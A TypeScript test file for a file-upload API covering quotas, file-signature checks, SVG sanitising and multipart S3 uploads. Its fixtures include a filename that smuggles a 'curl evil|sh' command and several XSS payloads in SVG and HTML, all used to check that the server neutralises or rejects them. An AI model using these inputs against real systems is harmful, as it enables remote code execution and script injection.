import { describe, expect, it, vi } from 'vitest';
import { api, createUser } from './helpers';
import { File } from '../src/models/File';
import { User } from '../src/models/User';
import {
  abortMultipartUpload,
  completeMultipartUpload,
  deleteFromS3,
  getObjectSize,
  listUploadedParts,
  readObjectStart,
} from '../src/services/storage.service';

vi.mock('../src/services/storage.service', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../src/services/storage.service')>();
  return {
    ...actual,
    createPresignedUpload: vi.fn(async ({ key }: { key: string }) => ({ url: 'https://s3.test/', fields: { key } })),
    getObjectSize: vi.fn(async () => 5000 as number | null),
    deleteFromS3: vi.fn(async () => undefined),
    startMultipartUpload: vi.fn(async () => 'upload-1'),
    presignUploadParts: vi.fn(async (_key: string, _id: string, parts: number[]) =>
      Object.fromEntries(parts.map((n) => [n, `https://s3.test/part-${n}`]))
    ),
    listUploadedParts: vi.fn(async () => [] as Array<{ partNumber: number; etag: string; size: number }> | null),
    completeMultipartUpload: vi.fn(async () => undefined),
    abortMultipartUpload: vi.fn(async () => undefined),
    // Uploads in these tests are PNGs unless a test says otherwise.
    readObjectStart: vi.fn(async () => Buffer.from('89504e470d0a1a0a0000000d49484452', 'hex') as Buffer | null),
  };
});

describe('POST /files/upload-url', () => {
  it('builds the storage key from the MIME type, never the filename', async () => {
    const { user, auth } = await createUser();
    const res = await api()
      .post('/api/v1/files/upload-url')
      .set(auth)
      .send({ filename: 'a.mp4";curl${IFS}evil|sh;"', mimeType: 'video/mp4', size: 1000 });
    expect(res.status).toBe(200);
    const file = await File.findById(res.body.fileId);
    expect(file!.storageKey).toMatch(new RegExp(`^users/${user._id}/uploads/[0-9a-f-]{36}\\.mp4$`));
    expect(file!.cdnUrl).toMatch(/^https:\/\/cdn\.test\/users\/[0-9a-f]+\/uploads\/[0-9a-f-]{36}\.mp4$/);
    // The original name is kept only as display text.
    expect(file!.originalName).toBe('a.mp4";curl${IFS}evil|sh;"');
  });

  it('rejects file types that are not allowed', async () => {
    const { auth } = await createUser();
    const res = await api().post('/api/v1/files/upload-url').set(auth).send({ filename: 'x.sh', mimeType: 'application/x-sh', size: 10 });
    expect(res.status).toBe(400);
    expect(res.body.code).toBe('UNSUPPORTED_FILE_TYPE');
  });

  it('accepts fonts sent without a MIME type', async () => {
    // Fonts need a plan that allows them (customFontsAllowed)
    const { auth } = await createUser({ role: 'pro' });
    const res = await api().post('/api/v1/files/upload-url').set(auth).send({ filename: 'Brand.otf', mimeType: 'application/octet-stream', size: 10 });
    expect(res.status).toBe(200);
    expect(res.body.cdnUrl).toMatch(/\.otf$/);
  });
});

describe('storage accounting', () => {
  async function upload(auth: Record<string, string>, size = 1000) {
    const res = await api().post('/api/v1/files/upload-url').set(auth).send({ filename: 'p.png', mimeType: 'image/png', size });
    expect(res.status).toBe(200);
    return res.body.fileId as string;
  }
  const storageUsed = async (userId: unknown) => (await User.findById(userId))!.quotaUsage.storageUsed;

  it('charges the size that landed in S3, once, and refunds it once on delete', async () => {
    const { user, auth } = await createUser();
    const fileId = await upload(auth, 1000);
    expect((await api().post(`/api/v1/files/${fileId}/complete`).set(auth)).status).toBe(200);
    expect((await api().post(`/api/v1/files/${fileId}/complete`).set(auth)).status).toBe(200);
    expect(await storageUsed(user._id)).toBe(5000);
    expect((await File.findById(fileId))!.size).toBe(5000);

    await api().delete(`/api/v1/files/${fileId}`).set(auth);
    await api().delete(`/api/v1/files/${fileId}`).set(auth);
    expect(await storageUsed(user._id)).toBe(0);
  });

  it("doesn't mark an upload ready if nothing reached S3", async () => {
    const { user, auth } = await createUser();
    const fileId = await upload(auth);
    vi.mocked(getObjectSize).mockResolvedValueOnce(null);
    const res = await api().post(`/api/v1/files/${fileId}/complete`).set(auth);
    expect(res.status).toBe(400);
    expect(res.body.code).toBe('UPLOAD_NOT_FOUND');
    expect(await storageUsed(user._id)).toBe(0);
  });

  it('refuses an upload bigger than the storage left, with a clear code', async () => {
    const { auth } = await createUser();
    const res = await api().post('/api/v1/files/upload-url').set(auth).send({ filename: 'p.png', mimeType: 'image/png', size: 1e12 });
    expect(res.status).toBe(403);
    expect(res.body.code).toBe('STORAGE_LIMIT_EXCEEDED');
  });
});

describe('upload content check on complete', () => {
  const hex = (h: string) => Buffer.from(h.replace(/\s/g, ''), 'hex');
  const text = (t: string) => Buffer.from(t, 'utf8');
  const FIXTURES: Record<string, Buffer> = {
    mp4: hex('00000020 66747970 69736f6d 00000200 69736f6d 69736f32'), // ....ftypisom
    mov: hex('00000014 66747970 71742020 20050300 71742020'), // ftypqt
    oldMov: hex('0000006c 6d6f6f76 0000006c 6d766864'), // moov atom first
    m4a: hex('0000001c 66747970 4d344120 00000000 4d344120'), // ftypM4A
    webm: hex('1a45dfa3 9f4286 81 01'),
    mp3Id3: text('ID3\x04\x00\x00\x00\x00\x00\x00'),
    mp3Frame: hex('fffb9064 00000000'),
    wav: Buffer.concat([text('RIFF'), hex('24080000'), text('WAVEfmt ')]),
    ogg: text('OggS\x00\x02'),
    aac: hex('fff15080 2f7ffc'),
    png: hex('89504e470d0a1a0a0000000d49484452'),
    jpeg: hex('ffd8ffe000104a464946'),
    gif: text('GIF89a\x01\x00'),
    webp: Buffer.concat([text('RIFF'), hex('1a000000'), text('WEBPVP8 ')]),
    svg: text('\uFEFF<?xml version="1.0"?>\n<!-- logo -->\n<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "x">\n<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1"/></svg>'),
    html: text('<!doctype html><html><script>alert(1)</script>'),
    exe: text('MZ\x90\x00\x03'),
    zip: hex('504b0304 14000000'),
    utf16: hex('fffe3c00 68007400'),
  };

  async function uploadAs(auth: Record<string, string>, filename: string, mimeType: string) {
    const res = await api().post('/api/v1/files/upload-url').set(auth).send({ filename, mimeType, size: 1000 });
    expect(res.status).toBe(200);
    return res.body.fileId as string;
  }

  async function complete(auth: Record<string, string>, fileId: string, head: Buffer) {
    vi.mocked(readObjectStart).mockResolvedValueOnce(head);
    return api().post(`/api/v1/files/${fileId}/complete`).set(auth);
  }

  it.each([
    ['clip.mp4', 'video/mp4', 'mp4'],
    ['clip.mov', 'video/quicktime', 'mov'],
    ['old.mov', 'video/quicktime', 'oldMov'],
    ['clip.webm', 'video/webm', 'webm'],
    // Browsers mislabel containers; the family still matches.
    ['clip.mkv', 'video/mp4', 'webm'],
    ['voice.m4a', 'audio/mp4', 'm4a'],
    ['song.mp3', 'audio/mpeg', 'mp3Id3'],
    ['song.mp3', 'audio/mpeg', 'mp3Frame'],
    ['take.wav', 'audio/wav', 'wav'],
    ['take.ogg', 'audio/ogg', 'ogg'],
    ['take.aac', 'audio/aac', 'aac'],
    ['p.png', 'image/png', 'png'],
    ['p.jpg', 'image/jpeg', 'jpeg'],
    ['p.png', 'image/jpeg', 'png'],
    ['p.gif', 'image/gif', 'gif'],
    ['p.webp', 'image/webp', 'webp'],
    ['logo.svg', 'image/svg+xml', 'svg'],
  ])('accepts %s sent as %s (%s bytes)', async (filename, mimeType, fixture) => {
    const { auth } = await createUser();
    const fileId = await uploadAs(auth, filename, mimeType);
    const res = await complete(auth, fileId, FIXTURES[fixture]);
    expect(res.status).toBe(200);
    expect((await File.findById(fileId))!.status).toBe('ready');
  });

  it.each([
    ['evil.mp4', 'video/mp4', 'html'],
    ['evil.mp4', 'video/mp4', 'exe'],
    ['evil.mp3', 'audio/mpeg', 'zip'],
    ['evil.mp3', 'audio/mpeg', 'utf16'],
    ['evil.png', 'image/png', 'html'],
    ['evil.png', 'image/png', 'mp4'],
    ['evil.svg', 'image/svg+xml', 'html'],
  ])('rejects %s sent as %s containing %s', async (filename, mimeType, fixture) => {
    const { user, auth } = await createUser();
    const fileId = await uploadAs(auth, filename, mimeType);
    const file = await File.findById(fileId);
    const res = await complete(auth, fileId, FIXTURES[fixture]);
    expect(res.status).toBe(422);
    expect(res.body.code).toBe('FILE_CONTENT_MISMATCH');
    expect(res.body.message).toMatch(/doesn't look like/);
    expect(deleteFromS3).toHaveBeenCalledWith(file!.storageKey);
    const after = await File.findById(fileId);
    expect(after!.status).toBe('failed');
    expect((await User.findById(user._id))!.quotaUsage.storageUsed).toBe(0);

    // Completing again doesn't resurrect it.
    const again = await api().post(`/api/v1/files/${fileId}/complete`).set(auth);
    expect(again.status).toBe(422);
    expect((await File.findById(fileId))!.status).toBe('failed');
  });

  it.each([
    ['script', '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'],
    ['namespaced script', '<svg xmlns:x="http://www.w3.org/2000/svg"><x:script>alert(1)</x:script></svg>'],
    ['onload', '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>'],
    ['javascript href', '<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><rect/></a></svg>'],
    ['entity-encoded javascript', '<svg xmlns="http://www.w3.org/2000/svg"><a href="&#106;ava&#x73;cript:alert(1)"><rect/></a></svg>'],
    ['iframe', '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><iframe src="https://x"/></foreignObject></svg>'],
  ])('rejects an SVG with active content (%s)', async (_name, svg) => {
    const { auth } = await createUser();
    const fileId = await uploadAs(auth, 'logo.svg', 'image/svg+xml');
    const res = await complete(auth, fileId, text(svg));
    expect(res.status).toBe(422);
    expect(res.body.code).toBe('SVG_ACTIVE_CONTENT');
    expect((await File.findById(fileId))!.status).toBe('failed');
  });

  it('asks S3 for the first 4 KB only (the whole SVG, up to 2 MB, for SVGs)', async () => {
    const { auth } = await createUser();
    const png = await uploadAs(auth, 'p.png', 'image/png');
    await complete(auth, png, FIXTURES.png);
    expect(readObjectStart).toHaveBeenLastCalledWith(expect.stringMatching(/\.png$/), 4096);
    const svg = await uploadAs(auth, 'logo.svg', 'image/svg+xml');
    await complete(auth, svg, FIXTURES.svg);
    expect(readObjectStart).toHaveBeenLastCalledWith(expect.stringMatching(/\.svg$/), 2 * 1024 * 1024);
  });

  it("doesn't fail a genuine upload when S3 can't be read for the check", async () => {
    const { auth } = await createUser();
    const fileId = await uploadAs(auth, 'clip.mp4', 'video/mp4');
    vi.mocked(readObjectStart).mockRejectedValueOnce(new Error('socket hang up'));
    const res = await api().post(`/api/v1/files/${fileId}/complete`).set(auth);
    expect(res.status).toBe(200);
  });
});

describe('multipart uploads', () => {
  const MiB = 1024 * 1024;
  const SIZE = 20 * MiB + 123; // 8 + 8 + 4 MiB and a bit
  async function start(auth: Record<string, string>, size = SIZE, mimeType = 'image/png') {
    const res = await api().post('/api/v1/files/multipart').set(auth).send({ filename: 'big.png', mimeType, size });
    expect(res.status).toBe(200);
    return res.body as { fileId: string; partSize: number; partCount: number };
  }
  const allParts = (size = SIZE) => [
    { partNumber: 1, etag: '"a"', size: 8 * MiB },
    { partNumber: 2, etag: '"b"', size: 8 * MiB },
    { partNumber: 3, etag: '"c"', size: size - 16 * MiB },
  ];

  it('starts with 8 MiB parts and signs only parts that exist', async () => {
    const { auth } = await createUser();
    const { fileId, partSize, partCount } = await start(auth);
    expect(partSize).toBe(8 * MiB);
    expect(partCount).toBe(3);
    const ok = await api().post(`/api/v1/files/${fileId}/multipart/urls`).set(auth).send({ partNumbers: [1, 3] });
    expect(ok.status).toBe(200);
    expect(Object.keys(ok.body.urls)).toEqual(['1', '3']);
    const bad = await api().post(`/api/v1/files/${fileId}/multipart/urls`).set(auth).send({ partNumbers: [4] });
    expect(bad.status).toBe(400);
  });

  it('checks the plan before starting', async () => {
    const { auth } = await createUser();
    const res = await api().post('/api/v1/files/multipart').set(auth).send({ filename: 'huge.png', mimeType: 'image/png', size: 1e15 });
    expect(res.status).toBe(403);
    expect(res.body.code).toBe('STORAGE_LIMIT_EXCEEDED');
  });

  it("lists the parts S3 has, so a reload can resume", async () => {
    const { auth } = await createUser();
    const { fileId } = await start(auth);
    vi.mocked(listUploadedParts).mockResolvedValueOnce(allParts().slice(0, 2));
    const res = await api().get(`/api/v1/files/${fileId}/multipart/parts`).set(auth);
    expect(res.status).toBe(200);
    expect(res.body.parts).toEqual([{ partNumber: 1, size: 8 * MiB }, { partNumber: 2, size: 8 * MiB }]);
  });

  it('says which parts are missing instead of finishing', async () => {
    const { auth } = await createUser();
    const { fileId } = await start(auth);
    vi.mocked(listUploadedParts).mockResolvedValueOnce([allParts()[0]]);
    const res = await api().post(`/api/v1/files/${fileId}/multipart/complete`).set(auth);
    expect(res.status).toBe(409);
    expect(res.body.code).toBe('UPLOAD_INCOMPLETE');
    expect(completeMultipartUpload).not.toHaveBeenCalled();
  });

  it('puts the parts together, then charges what landed, once', async () => {
    const { user, auth } = await createUser();
    const { fileId } = await start(auth);
    vi.mocked(listUploadedParts).mockResolvedValueOnce(allParts());
    vi.mocked(getObjectSize).mockResolvedValue(SIZE);
    try {
      const res = await api().post(`/api/v1/files/${fileId}/multipart/complete`).set(auth);
      expect(res.status).toBe(200);
      expect(completeMultipartUpload).toHaveBeenCalledWith(expect.any(String), 'upload-1', allParts());
      const file = await File.findById(fileId);
      expect(file!.status).toBe('ready');
      expect(file!.multipart).toBeUndefined();
      // A retry after a lost response: still fine, not charged twice
      const again = await api().post(`/api/v1/files/${fileId}/multipart/complete`).set(auth);
      expect(again.status).toBe(200);
      expect((await User.findById(user._id))!.quotaUsage.storageUsed).toBe(SIZE);
    } finally {
      vi.mocked(getObjectSize).mockResolvedValue(5000);
    }
  });

  it('finishes when S3 already put it together but the reply was lost', async () => {
    const { auth } = await createUser();
    const { fileId } = await start(auth);
    vi.mocked(listUploadedParts).mockResolvedValueOnce(null);
    const res = await api().post(`/api/v1/files/${fileId}/multipart/complete`).set(auth);
    expect(res.status).toBe(200);
    expect((await File.findById(fileId))!.status).toBe('ready');
  });

  it('says the upload expired when S3 has neither the parts nor the file', async () => {
    const { auth } = await createUser();
    const { fileId } = await start(auth);
    vi.mocked(listUploadedParts).mockResolvedValueOnce(null);
    vi.mocked(getObjectSize).mockResolvedValueOnce(null);
    const res = await api().post(`/api/v1/files/${fileId}/multipart/complete`).set(auth);
    expect(res.status).toBe(410);
    expect(res.body.code).toBe('UPLOAD_EXPIRED');
  });

  it('refuses parts that add up to more than was declared', async () => {
    const { auth } = await createUser();
    const { fileId } = await start(auth);
    const parts = allParts();
    parts[2] = { ...parts[2], size: parts[2].size + 1 };
    vi.mocked(listUploadedParts).mockResolvedValueOnce(parts);
    const res = await api().post(`/api/v1/files/${fileId}/multipart/complete`).set(auth);
    expect(res.status).toBe(422);
    expect(res.body.code).toBe('UPLOAD_SIZE_MISMATCH');
    expect(abortMultipartUpload).toHaveBeenCalled();
    expect(completeMultipartUpload).not.toHaveBeenCalled();
    expect((await File.findById(fileId))!.status).toBe('failed');
  });

  it('cancels: drops the parts and marks the upload failed', async () => {
    const { auth } = await createUser();
    const { fileId } = await start(auth);
    const res = await api().delete(`/api/v1/files/${fileId}/multipart`).set(auth);
    expect(res.status).toBe(200);
    expect(abortMultipartUpload).toHaveBeenCalledWith(expect.any(String), 'upload-1');
    expect((await File.findById(fileId))!.status).toBe('failed');
  });

  it("keeps other users out", async () => {
    const { auth } = await createUser();
    const other = await createUser();
    const { fileId } = await start(auth);
    expect((await api().get(`/api/v1/files/${fileId}/multipart/parts`).set(other.auth)).status).toBe(404);
    expect((await api().post(`/api/v1/files/${fileId}/multipart/complete`).set(other.auth)).status).toBe(404);
  });
});
